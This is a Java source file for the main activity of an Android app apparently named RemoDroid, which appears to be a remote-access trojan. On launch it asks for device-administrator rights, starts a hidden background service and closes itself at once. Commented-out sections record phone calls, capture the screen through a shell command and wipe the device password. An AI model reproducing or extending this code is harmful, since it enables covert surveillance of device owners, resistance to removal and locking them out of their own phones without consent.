package com.remo;

import android.app.Activity;
//import android.content.Context;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.StrictMode;
import android.util.Log;
import com.remo.features.broadcastReceivers.DeviceAdmin;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("REMODROID", "Main Activity Started");
        Thread.setDefaultUncaughtExceptionHandler(
                new Thread.UncaughtExceptionHandler() {
                    @Override
                    public void uncaughtException(Thread thread, Throwable ex) {
                        Log.e("REMODROID", "Main Thread UncaughtException: " + ex.getMessage());
                    }
                });


//        CallRecorder phoneListener = new CallRecorder();
//        TelephonyManager telephonyManager = (TelephonyManager) this
//                .getSystemService(Context.TELEPHONY_SERVICE);
//        telephonyManager.listen(phoneListener,
//                PhoneStateListener.LISTEN_CALL_STATE);



//        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
//        ComponentName demoDeviceAdmin = new ComponentName(this, DeviceAdmin.class);
//        Log.e("DeviceAdminActive==", "" + demoDeviceAdmin);
//
//        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);// adds new device administrator
//        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, demoDeviceAdmin);//ComponentName of the administrator component.
//        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
//                "Disable app");//dditional explanation
//        startActivityForResult(intent, 0);


        try {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(this, DeviceAdmin.class);
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent.putExtra("android.app.extra.DEVICE_ADMIN", componentName);
                startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }









        startService(new Intent(getApplicationContext(), MainService.class));

//        String[] s = getClassesOfPackage(Feature.class.getPackage().getName());
//        for(String c: s){
//            Log.d("REMODROID",c);
//        }

//        Field[] aClassFields = .getDeclaredFields();
//        for(Field f : aClassFields){
//            // Found getSize field f
//        }




      //  getApplicationContext().deleteFile(filename);
        //Log.d("REMODROID", (getApplicationContext() == App.get().getApplicationContext())+"");

        //For networking on main Thread
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

//        Thread SCreen = new Thread(new Runnable() {
//            @Override
//            public void run() {
//                String commandToRun = "adb shell screenrecord --time-limit 10 /sdcard/demo.mp4";
//                try {
//                    Runtime.getRuntime().exec(commandToRun);
//                    runShellCommand(commandToRun);
//                } catch (Exception ex) {
//                    Log.e("REMODROID", "ADB Error "+ex.getMessage());
//                }
//            }
//        });
//        SCreen.start();
//        try {
//            Thread.sleep(10000);
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//        process.destroy();


//        mDeviceAdminSample = new ComponentName(this,DeviceAdminSampleReceiver.class);
//        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
//        this.startActivityForResult(intent, 0);
//
//
//        DevicePolicyManager deviceManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
//        ComponentName compName = new ComponentName(this, MainService.class);
//        deviceManager.setPasswordMinimumLength(compName, 0);
//        boolean result = deviceManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);

//        try {
//            Document doc = Jsoup.connect("http://www.wikia.com/fandom").get();
//            String title = doc.title();
//            Log.d("REMODROID", title);
//        }catch (Exception ex){
//            Log.e("REMODROID", "Jsoup Error "+ex.getMessage());
//        }



        onBackPressed();

    }





//    private String[] getClassesOfPackage(String packageName) {
//        ArrayList<String> classes = new ArrayList<String>();
//        try {
//            String packageCodePath = getPackageCodePath();
//            DexFile df = new DexFile(packageCodePath);
//            for (Enumeration<String> iter = df.entries(); iter.hasMoreElements(); ) {
//                String className = iter.nextElement();
//                if (className.contains(packageName)) {
//                    classes.add(className.substring(className.lastIndexOf(".") + 1, className.length()));
//                }
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//
//        return classes.toArray(new String[classes.size()]);
//    }


}
